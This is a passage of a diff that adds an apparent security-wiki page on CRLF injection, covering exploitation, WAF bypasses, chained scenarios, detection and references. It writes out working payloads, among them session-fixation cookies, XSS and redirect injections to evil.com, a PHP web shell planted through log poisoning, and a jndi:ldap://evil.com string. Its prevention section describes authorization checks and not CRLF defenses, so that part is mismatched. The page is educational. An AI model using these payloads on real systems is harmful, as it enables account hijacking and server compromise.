+<li>Injects a <code>Set-Cookie</code> header to force the victim&rsquo;s browser to store a session ID known to the attacker. When the victim logs in, the attacker hijacks the session.</li>
+</ul>
+<p><strong><code>/%0D%0ASet-Cookie:sessionid=ATTACKER123</code></strong></p>
+<h3 id="c-crlf-to-xss">
+  <strong>c) CRLF to XSS</strong>
+  <a class="anchor" href="#c-crlf-to-xss">#</a>
+</h3>
+<ul>
+<li>Injects headers to disable XSS filters and set content type, followed by a double CRLF and a <code>&lt;script&gt;</code> tag. The browser executes the script in the victim&rsquo;s context.</li>
+</ul>
+<p><strong><code>/%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</code></strong></p>
+<h3 id="d-crlf-to-open-redirect">
+  <strong>d) CRLF to Open Redirect</strong>
+  <a class="anchor" href="#d-crlf-to-open-redirect">#</a>
+</h3>
+<ul>
+<li>Injects a <code>Location</code> header pointing to a malicious site. The victim clicks a legitimate-looking link but gets silently redirected to <a href="https://evil.com/" target="_blank" rel="noreferrer noopener nofollow">evil.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">.
+<strong><code>/%0d%0aLocation:https://evil.com</code></strong></li>
+<li><strong>Alternative methods:</strong> Can also inject HTML <code>&lt;meta&gt;</code> refresh tags or JavaScript <code>document.location</code> for client-side redirects.</li>
+</ul>
+<h3 id="e-cache-poisoning">
+  <strong>e) Cache Poisoning</strong>
+  <a class="anchor" href="#e-cache-poisoning">#</a>
+</h3>
+<ul>
+<li>Injects malicious content into a shared cache (CDN or proxy). Every user who hits the cached URL gets the attacker&rsquo;s payload until it expires.</li>
+</ul>
+<p><strong><code>/%0d%0aX-Cache-Poison:true%0d%0a%0d%0a&lt;html&gt;Hacked for everyone&lt;/html&gt;</code></strong></p>
+<h3 id="f-cors-bypass">
+  <strong>f) CORS Bypass</strong>
+  <a class="anchor" href="#f-cors-bypass">#</a>
+</h3>
+<ul>
+<li>Injects <code>Access-Control-Allow-Origin: *</code> to disable CORS restrictions. <a href="https://evil.com/" target="_blank" rel="noreferrer noopener nofollow">Evil.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> can now make authenticated requests to the vulnerable site and read sensitive responses.</li>
+</ul>
+<p><strong><code>/%0d%0aAccess-Control-Allow-Origin:*%0d%0aAccess-Control-Allow-Credentials:true</code></strong></p>
+<h3 id="g-log-poisoning">
+  <strong>g) Log Poisoning</strong>
+  <a class="anchor" href="#g-log-poisoning">#</a>
+</h3>
+<ul>
+<li>Injects fake entries into server logs to hide malicious activity or mislead admins. In severe cases, injects executable code that runs when logs are viewed.</li>
+</ul>
+<p><strong><code>/%0d%0a[INFO] Admin login successful from 127.0.0.1</code></strong></p>
+<ul>
+<li><strong>Test approach:</strong> Check any user-controlled input (User-Agent, Referer, URL parameters) that ends up in log files. Inject CRLF and verify if new log lines are created.</li>
+</ul>
+<hr>
+<h2 id="5-bypassing-defenses">
+  <strong>5. Bypassing Defenses</strong>
+  <a class="anchor" href="#5-bypassing-defenses">#</a>
+</h2>
+<h3 id="a-double-encoding">
+  <strong>a) Double Encoding</strong>
+  <a class="anchor" href="#a-double-encoding">#</a>
+</h3>
+<ul>
+<li><strong>What it does:</strong> When a server decodes input twice, single-encoded payloads get caught but double-encoded ones slip through. The first decode turns <code>%25</code> into <code>%</code>, revealing the real payload on the second pass.</li>
+<li><strong>Payload:</strong> <code>%250D%250A</code> (decodes to <code>%0D%0A</code>)</li>
+<li><strong>Example:</strong> <code>https://example.com/page?redirect=//home%250D%250ALocation:https://evil.com</code></li>
+</ul>
+<h3 id="b-unicode-encoding-utf-8-bypass">
+  <strong>b) Unicode Encoding (UTF-8 Bypass)</strong>
+  <a class="anchor" href="#b-unicode-encoding-utf-8-bypass">#</a>
+</h3>
+<ul>
+<li><strong>What it does:</strong> Uses multibyte UTF-8 characters that decode to CR or LF. WAFs looking for single-byte <code>0x0D</code> or <code>0x0A</code> miss these, but the backend converts them back.</li>
+<li><strong>Payloads:</strong>
+For <code>\n</code>: <code>%E5%98%8A</code> (becomes <code>0x0A</code>)
+For <code>\r</code>: <code>%E5%98%8D</code> (becomes <code>0x0D</code>)</li>
+<li><strong>Example (HackerOne report):</strong> 
+<code>/%E5%98%8ASet-Cookie:test</code> instead of <code>/%0aSet-Cookie:test</code></li>
+</ul>
+<h3 id="c-using-only0aor0d">
+  <strong>c) Using only <code>%0a</code> or <code>%0d</code></strong>
+  <a class="anchor" href="#c-using-only0aor0d">#</a>
+</h3>
+<ul>
+<li><strong>What it does:</strong> Many backends accept a single <code>\n</code> as a valid header terminator even though RFC mandates <code>\r\n</code>. If a WAF blocks the full sequence but ignores lone feeds, <code>%0a</code> works.</li>
+<li><strong>Example (Akamai bypass):</strong> <code>GET /%0ASet-Cookie:test=test HTTP/1.1</code></li>
+<li><strong>For Mixed case :</strong> <code>%0d%0A</code> or <code>%0D%0a</code> can bypass case-sensitive regex filters.</li>
+</ul>
+<h3 id="d-http2-exclusive-vectors-crlf-smuggling">
+  <strong>d) HTTP/2 Exclusive Vectors (CRLF Smuggling)</strong>
+  <a class="anchor" href="#d-http2-exclusive-vectors-crlf-smuggling">#</a>
+</h3>
+<ul>
+<li><strong>What it does:</strong> HTTP/2 is binary—no <code>\r\n</code> in transit. When a frontend downgrades to HTTP/1.1 for the backend, it reconstructs headers. If it doesn&rsquo;t validate header values, you can smuggle raw newlines inside them.</li>
+<li><strong>Example (Uvicorn CVE):</strong></li>
+</ul>
+<pre tabindex="0"><code># HTTP/2 request
+foo = bar\nTransfer-Encoding: chunked
+
+# Becomes HTTP/1.1
+foo: bar
+Transfer-Encoding: chunked
+</code></pre><h3 id="e-path-obfuscation-and">
+  <strong>e) Path Obfuscation (<code>../</code> and <code>?</code>)</strong>
+  <a class="anchor" href="#e-path-obfuscation-and">#</a>
+</h3>
+<ul>
+<li><strong>What it does:</strong> Uses path traversal or query delimiters to move your payload into a different context where it gets reflected unsanitized.</li>
+<li><strong>Example:</strong> <code>/%2F..%0d%0aSet-Cookie:test</code> — The <code>%2F..</code> gets normalized, but the CRLF payload remains.</li>
+</ul>
+<h3 id="f-header-value-injection">
+  <strong>f) Header Value Injection</strong>
+  <a class="anchor" href="#f-header-value-injection">#</a>
+</h3>
+<ul>
+<li><strong>What it does:</strong> Inject <code>Content-Encoding: deflate</code> plus a compressed XSS payload. The WAF sees binary garbage and allows it; the browser decompresses and executes the script.</li>
+<li><strong>Example (Akamai XSS bypass):</strong></li>
+</ul>
+<pre tabindex="0"><code>GET /%0d%0aContent-Encoding:%20deflate%0d%0aContent-Length:%2026%0d%0a%0d%0a[compressed-binary-data] HTTP/1.1
+</code></pre><h3 id="g-splitting-with0content-length">
+  <strong>g) Splitting with <code>0</code> Content-Length</strong>
+  <a class="anchor" href="#g-splitting-with0content-length">#</a>
+</h3>
+<ul>
+<li><strong>What it does:</strong> Injects <code>Content-Length:0</code> to end the current response early, then starts a fresh attacker-controlled response. Bypasses filters looking for double CRLF.</li>
+<li><strong>Example:</strong></li>
+</ul>
+<pre tabindex="0"><code>/%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:19%0d%0a%0d%0a&lt;html&gt;Hacked&lt;/html&gt;
+</code></pre><hr>
+<h2 id="6-advanced-attack-scenarios">
+  <strong>6. Advanced Attack Scenarios</strong>
+  <a class="anchor" href="#6-advanced-attack-scenarios">#</a>
+</h2>
+<h3 id="a-chaining-with-ssrf">
+  <strong>a) Chaining with SSRF</strong>
+  <a class="anchor" href="#a-chaining-with-ssrf">#</a>
+</h3>
+<ul>
+<li>
+<p>CRLF injection can help bypass SSRF protections, allowing an attacker to reach internal systems that should be off-limits.</p>
+</li>
+<li>
+<p><strong>Example (CTF Write-up):</strong></p>
+<p>In a capture-the-flag challenge, the server tried to validate a URL path by checking its first character. If the path started with a number, it was blocked.</p>
+<ul>
+<li><strong>The Bypass:</strong> The attacker injected a newline character (<code>%0D%0A</code>) right before the path. This split the request, making the first character look valid to the validator, but the actual request sent to the internal server contained the forbidden path starting with a number .</li>
+<li><strong>Result:</strong> The attacker successfully reached an internal service (<code>http://localhost:10011/1/flag</code>) that was not meant to be public, retrieving the flag .</li>
+</ul>
+</li>
+</ul>
+<h3 id="b-web-cache-poisoning">
+  <strong>b) Web Cache Poisoning</strong>
+  <a class="anchor" href="#b-web-cache-poisoning">#</a>
+</h3>
+<ul>
+<li>
+<p>This turns a &ldquo;self-attack&rdquo; into a &ldquo;mass attack.&rdquo; By injecting headers, an attacker can trick a caching server (like Nginx) into storing a malicious version of a page and serving it to other users.</p>
+</li>
+<li>
+<p><strong>Example (Snyk Research):</strong></p>
+<p>Researchers found that by injecting a custom <code>X-Accel-Expires</code> header via CRLF, they could override a website&rsquo;s normal caching rules .</p>
+<ul>
+<li>A page had a <code>Cache-Control: no-cache</code> header (telling caches &ldquo;do not store this&rdquo;).</li>
+<li><strong>The Exploit:</strong> An attacker injected <code>X-Accel-Expires: 3600</code> into the response. Nginx respects this header. It ignored the &ldquo;no-cache&rdquo; instruction and cached the page for an hour .</li>
+<li><strong>Result:</strong> The attacker combined this with a Host Header Injection vulnerability. They poisoned the cache with a page containing malicious links. Any victim visiting the normal URL received the attacker&rsquo;s poisoned page from the cache, not the real one .</li>
+</ul>
+</li>
+</ul>
+<h3 id="c-log-injection-and-evasion">
+  <strong>c) Log Injection (and Evasion)</strong>
+  <a class="anchor" href="#c-log-injection-and-evasion">#</a>
+</h3>
+<p>Logs are meant to track, but CRLF lets attackers blind the security team or even use logs to deliver malware.</p>
+<ul>
+<li>Sometimes applications read log files and display them in a browser (like an admin panel showing recent visits).</li>
+<li>Instead of just hiding, an attacker injects actual code into the log:</li>
+</ul>
+<pre tabindex="0"><code>User-Agent: &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+</code></pre><ul>
+<li>Now the log file contains PHP code. When the admin panel loads the logs, that code executes on the server.</li>
+<li><strong>Result:</strong> The attacker visits <code>admin/logs.php?cmd=ls</code> and the server runs that command. One injection + one file inclusion = full shell access .</li>
+</ul>
+<h3 id="d-phishing-via-response-manipulation">
+  <strong>d) Phishing via Response Manipulation</strong>?
+  <a class="anchor" href="#d-phishing-via-response-manipulation">#</a>
+</h3>
+<ul>
+<li>
+<p><strong>Example (Pi-hole Vulnerability):</strong></p>
+<p>A CRLF vulnerability was found in Pi-hole (a DNS tool). An attacker could inject a double CRLF (<code>\r\n\r\n</code>) to split the HTTP response and inject a whole new HTML body .</p>
+<ul>
+<li><strong>Payload:</strong> Visiting a URL like <code>http://pi-hole/admin/index%0d%0aSet-Cookie:%20sid=INYECTED.lp</code> injected a fake cookie .</li>
+<li><strong>Result:</strong> An attacker could modify this to inject a fake login form directly into the Pi-hole admin page. The URL looks legitimate, but the page content is now controlled by the attacker, stealing credentials from anyone who tries to log in.</li>
+</ul>
+</li>
+</ul>
+<h3 id="e-session-fixation">
+  <strong>e) Session Fixation</strong>
+  <a class="anchor" href="#e-session-fixation">#</a>
+</h3>
+<p>This is a classic &ldquo;man-in-the-middle&rdquo; attack on sessions. Instead of stealing a cookie, the attacker forces the victim to use a cookie the **attacker already knows.</p>
+<ul>
+<li>
+<p><strong>Example (Gakido Library):</strong></p>
+<p>A Python HTTP library called <code>gakido</code> was vulnerable because it didn&rsquo;t sanitize header values. If an attacker controlled a header, they could inject a new one.</p>
+<ul>
+<li>
+<p><strong>Code:</strong></p>
+<pre tabindex="0"><code>c.get(&#34;https://httpbin.org/headers&#34;, headers={
+    &#34;User-Agent&#34;: &#34;test\r\nX-Injected: pwned&#34;
+})
+</code></pre><p>This would send two headers: <code>User-Agent: test</code> and <code>X-Injected: pwned</code> .</p>
+</li>
+<li>
+<p><strong>Exploiting Sessions:</strong> An attacker could change this to inject <code>Set-Cookie: sessionid=attacker123</code>. If they send a link to a victim, the victim&rsquo;s browser will store that specific session ID. If the victim then logs in, the attacker can use the same <code>sessionid=attacker123</code> to hijack the authenticated account</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="7-framework-specific-scenarios">
+  <strong>7. Framework-Specific Scenarios</strong>
+  <a class="anchor" href="#7-framework-specific-scenarios">#</a>
+</h2>
+<p><strong>a) Java – The TRACE Method</strong></p>
+<ul>
+<li>Older Java versions (1.4.1) had a <code>doTrace</code> method that blindly echoed every header back in the response.</li>
+<li><strong>Vulnerable Code:</strong></li>
+</ul>
+<pre tabindex="0"><code>responseString += CRLF + headerName + &#34;: &#34; + req.getHeader(headerName);
+</code></pre><p>It just concatenates whatever headers the user sends—no sanitization.</p>
+<ul>
+<li><strong>The exploit (Cross-Site Tracing):</strong> Attackers trick victims into sending a request with a malicious JavaScript header. The TRACE response echoes it back, and the victim&rsquo;s browser can read it (bypassing <code>HttpOnly</code> cookies) .</li>
+</ul>
+<p><strong>b) PHP – Two Danger Zones</strong></p>
+<p><strong>1. Mail Header Injection</strong></p>
+<p>If user input (like email subject) goes directly into <code>mail()</code> without sanitizing CR/LF, attackers can inject <code>Bcc:</code> headers. Simple contact forms become spam relays .</p>
+<p><strong>2. libcurl Header Injection</strong></p>
+<pre tabindex="0"><code>$headers = [&#34;X-API-KEY: &#34;.$_GET[&#34;API_KEY&#34;]];
+</code></pre><ul>
+<li>Send <code>?API_KEY=%0D%0AX-ADMIN-HEADER: a</code> and the internal server gets two headers. In cloud environments, inject <code>Metadata-Flavor: Google</code> to hit metadata servers via SSRF.</li>
+</ul>
+<p><strong>c) Node.js – The writeHead Mistake</strong></p>
+<p><strong>CVE-2016-5325:</strong> Node.js <code>ServerResponse#writeHead</code> allowed unsanitized user input in the status message argument. Attackers could inject new headers and split responses—a low-level function turned dangerous .</p>
+<p><strong>d) <a href="https://asp.net/" target="_blank" rel="noreferrer noopener nofollow">ASP.NET</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> – Redirect Abuse</strong></p>
+<ul>
+<li>Login pages with <code>returnUrl=/dashboard</code> parameters.</li>
+<li><strong>Exploit:</strong> <code>?returnUrl=/dashboard%0d%0aSet-Cookie:session=attacker123</code> injects a <code>Set-Cookie</code> header. The attacker fixes the session ID, waits for login, then hijacks the account .</li>
+</ul>
+<hr>
+<h2 id="8-detection-techniques">
+  <strong>8. Detection Techniques</strong>
+  <a class="anchor" href="#8-detection-techniques">#</a>
+</h2>
+<h3 id="manual-testing">
+  <strong>Manual Testing:</strong>
+  <a class="anchor" href="#manual-testing">#</a>
+</h3>
+<p><strong>Step 1: Find Potential Injection Points</strong></p>
+<p>look for places where user input might end up in response headers . Common spots:</p>
+<ul>
+<li>URL parameters (<code>?page=home</code>, <code>?redirect=../dashboard</code>)</li>
+<li>Path segments (<code>/en/home</code> → the <code>en</code> part)</li>
+<li>Request headers (<code>User-Agent</code>, <code>Referer</code>, <code>Cookie</code>)</li>
+<li>Form inputs that trigger redirects</li>
+</ul>
+<p><strong>Step 2: Test Payload</strong></p>
+<p>Inject a simple CRLF sequence followed by a test header:</p>
+<pre tabindex="0"><code>%0d%0aTest:Injected
+</code></pre><p>For example, if there&rsquo;s a <code>lang</code> parameter:</p>
+<pre tabindex="0"><code>GET /page?lang=en%0d%0aTest:Injected HTTP/1.1
+</code></pre><p><strong>Step 3: Check the Response</strong></p>
+<p>Check the response headers in Burp. If I see <code>Test: Injected</code> appearing as a separate header.
+The app is vulnerable .</p>
+<p><strong>Burp’s Response :</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Date: Mon, 16 Feb 2026 10:00:00 GMT
+Content-Type: text/html
+Test: Injected   &lt;-- This shouldn&#39;t be here!
+Server: nginx
+</code></pre><p><strong>Step 4: Confirm with a Real Exploit</strong></p>
+<p>To increase it’s impact:</p>
+<pre tabindex="0"><code>%0d%0aSet-Cookie:session=HACKED
+</code></pre><p>If  this cookie is reflects in the response headers, the vulnerability is confirmed .</p>
+<ul>
+<li>Sometimes <code>%0d%0a</code> gets blocked. Try just <code>%0a</code> (line feed only) - many servers accept it as a valid header terminator.</li>
+</ul>
+<hr>
+<h2 id="9-impact">
+  <strong>9. Impact</strong>
+  <a class="anchor" href="#9-impact">#</a>
+</h2>
+<ul>
+<li><strong>XSS:</strong> Inject <code>\r\n\r\n</code> to end headers and insert malicious scripts in responses.</li>
+<li><strong>Session Hijacking:</strong> Inject <code>Set-Cookie</code> headers to fix or steal user sessions.</li>
+<li><strong>Open Redirect / Phishing:</strong> Inject <code>Location</code> headers to redirect victims to malicious sites.</li>
+<li><strong>HTTP Response Splitting:</strong> Create multiple responses from a single request to control content.</li>
+<li><strong>Web Cache Poisoning:</strong> Inject malicious responses that get cached and served to many users.</li>
+<li><strong>CORS Bypass:</strong> Inject <code>Access-Control-Allow-Origin</code> to access sensitive cross-origin data.</li>
+<li><strong>Log Poisoning:</strong> Inject fake log entries to hide attacks or trigger XSS in admin panels.</li>
+</ul>
+<hr>
+<h2 id="10-prevention-techniques">
+  <strong>10. Prevention Techniques</strong>
+  <a class="anchor" href="#10-prevention-techniques">#</a>
+</h2>
+<ul>
+<li><strong>Enforce authorization on every request:</strong> Verify that the authenticated user is permitted to access the requested resource before processing the request.</li>
+<li><strong>Validate object ownership on the server:</strong> Do not rely on client-supplied object identifiers; always confirm that the requested object belongs to the current user or role.</li>
+<li><strong>Use centralized access control:</strong> Implement authorization checks in a common middleware or service to ensure they are applied consistently across the application.</li>
+<li><strong>Restrict access based on roles or attributes:</strong> Apply RBAC or ABAC according to the application&rsquo;s business requirements.</li>
+<li><strong>Scope requests to the current tenant or user:</strong> Ensure users cannot access resources outside their assigned tenant, organization, or ownership boundary.</li>
+<li><strong>Use non-sequential identifiers where appropriate:</strong> Prefer UUIDs or other unpredictable identifiers to reduce the likelihood of enumeration. However, identifier randomness must not replace authorization checks.</li>
+<li><strong>Log and monitor unauthorized access attempts:</strong> Record failed authorization checks and investigate repeated attempts to access other users&rsquo; resources.</li>
+<li><strong>Perform regular authorization testing:</strong> Include horizontal and vertical privilege escalation scenarios in security assessments to verify that access controls are consistently enforced.</li>
+</ul>
+<hr>
+<h2 id="11-tools">
+  <strong>11. Tools</strong>
+  <a class="anchor" href="#11-tools">#</a>
+</h2>
+<ul>
+<li><strong>Burp Suite</strong> – Manual testing and scanning.</li>
+<li><strong>Burp Bounty</strong> – Custom detection profiles.</li>
+<li><strong>OWASP ZAP</strong> – Automated vulnerability scanning.</li>
+<li><strong>Nuclei</strong> – Fast, template-based detection.</li>
+<li><strong>crlfuzz</strong> – Command-line fuzzer for CRLF.</li>
+<li><strong>CRLFsuite</strong> – Python-based detection tool.</li>
+</ul>
+<hr>
+<h2 id="12-good-to-read">
+  <strong>12. Good to Read</strong>
+  <a class="anchor" href="#12-good-to-read">#</a>
+</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2021-44228" target="_blank" rel="noreferrer noopener nofollow">**CVE-2021-44228</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> (Log4Shell precursor):** CRLF in logs → RCE chains
+Attackers injected malicious strings like <code>${jndi:ldap://evil.com/a}</code> into inputs that were written to logs. When the server processed these logs, it fetched and executed remote code, allowing full server compromise.</li>
+<li><a href="https://hackerone.com/reports/52042/" target="_blank" rel="noreferrer noopener nofollow">**Twitter 2010</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">:** Cache poison via CRLF → defaced trends
+Attackers injected <code>%0D%0A</code> in URL parameters to split HTTP responses and poison caching systems, causing fake trending topics and malicious content to appear for many users.</li>
+<li><strong>PayPal 2007:</strong> Response splitting → account redirects
+A vulnerable redirect parameter allowed attackers to inject CRLF sequences and create a second malicious response that redirected users to phishing pages and enabled session hijacking.</li>
+</ul>
+<hr>
+<h2 id="13-references">
+  <strong>13. References</strong>
+  <a class="anchor" href="#13-references">#</a>
+</h2>
+<ul>
+<li><a href="https://owasp.org/www-community/vulnerabilities/CRLF_Injection" target="_blank" rel="noreferrer noopener nofollow">OWASP CRLF Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://redfoxsec.com/blog/understanding-crlf-injection-attacks/" target="_blank" rel="noreferrer noopener nofollow">CRLF Injection Attacks Explained | Redfox Security</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://github.com/Raghavd3v/CRLFsuite" target="_blank" rel="noreferrer noopener nofollow">CRLFsuite GitHub</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://github.com/RevoltSecurities/Crlfix" target="_blank" rel="noreferrer noopener nofollow">Crlfix GitHub</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/web-security/crlf-injection" target="_blank" rel="noreferrer noopener nofollow">PortSwigger – CRLF Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/CRLF%20Injection.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#crlf-injection">CRLF Injection</a>
+      <ul>
+        <li><a href="#1-fundamentals-of-the-attack"><strong>1. Fundamentals of the Attack</strong></a>
+          <ul>
+            <li><a href="#importance-of-crlf"><strong>Importance of CRLF:</strong></a></li>
+            <li><a href="#working-of-crlf-in-http-"><strong>Working of CRLF in HTTP :</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#2-how-crlf-injection-works"><strong>2. How CRLF Injection Works</strong></a></li>
+        <li><a href="#3-attack-surfaces"><strong>3. Attack Surfaces</strong></a></li>
+        <li><a href="#4--exploiting-crlf-injection"><strong>4.  Exploiting CRLF Injection</strong></a>
+          <ul>
+            <li><a href="#a-http-response-splitting"><strong>a) HTTP Response Splitting</strong></a></li>
+            <li><a href="#b-cookie-injection-session-fixation"><strong>b) Cookie Injection (Session Fixation)</strong></a></li>
+            <li><a href="#c-crlf-to-xss"><strong>c) CRLF to XSS</strong></a></li>
+            <li><a href="#d-crlf-to-open-redirect"><strong>d) CRLF to Open Redirect</strong></a></li>
+            <li><a href="#e-cache-poisoning"><strong>e) Cache Poisoning</strong></a></li>
+            <li><a href="#f-cors-bypass"><strong>f) CORS Bypass</strong></a></li>
+            <li><a href="#g-log-poisoning"><strong>g) Log Poisoning</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#5-bypassing-defenses"><strong>5. Bypassing Defenses</strong></a>
+          <ul>
+            <li><a href="#a-double-encoding"><strong>a) Double Encoding</strong></a></li>
+            <li><a href="#b-unicode-encoding-utf-8-bypass"><strong>b) Unicode Encoding (UTF-8 Bypass)</strong></a></li>
+            <li><a href="#c-using-only0aor0d"><strong>c) Using only <code>%0a</code> or <code>%0d</code></strong></a></li>
+            <li><a href="#d-http2-exclusive-vectors-crlf-smuggling"><strong>d) HTTP/2 Exclusive Vectors (CRLF Smuggling)</strong></a></li>
+            <li><a href="#e-path-obfuscation-and"><strong>e) Path Obfuscation (<code>../</code> and <code>?</code>)</strong></a></li>
+            <li><a href="#f-header-value-injection"><strong>f) Header Value Injection</strong></a></li>
+            <li><a href="#g-splitting-with0content-length"><strong>g) Splitting with <code>0</code> Content-Length</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#6-advanced-attack-scenarios"><strong>6. Advanced Attack Scenarios</strong></a>
+          <ul>
+            <li><a href="#a-chaining-with-ssrf"><strong>a) Chaining with SSRF</strong></a></li>
+            <li><a href="#b-web-cache-poisoning"><strong>b) Web Cache Poisoning</strong></a></li>
+            <li><a href="#c-log-injection-and-evasion"><strong>c) Log Injection (and Evasion)</strong></a></li>
+            <li><a href="#d-phishing-via-response-manipulation"><strong>d) Phishing via Response Manipulation</strong>?</a></li>
+            <li><a href="#e-session-fixation"><strong>e) Session Fixation</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#7-framework-specific-scenarios"><strong>7. Framework-Specific Scenarios</strong></a></li>
+        <li><a href="#8-detection-techniques"><strong>8. Detection Techniques</strong></a>
+          <ul>
+            <li><a href="#manual-testing"><strong>Manual Testing:</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#9-impact"><strong>9. Impact</strong></a></li>
+        <li><a href="#10-prevention-techniques"><strong>10. Prevention Techniques</strong></a></li>
+        <li><a href="#11-tools"><strong>11. Tools</strong></a></li>
+        <li><a href="#12-good-to-read"><strong>12. Good to Read</strong></a></li>
+        <li><a href="#13-references"><strong>13. References</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
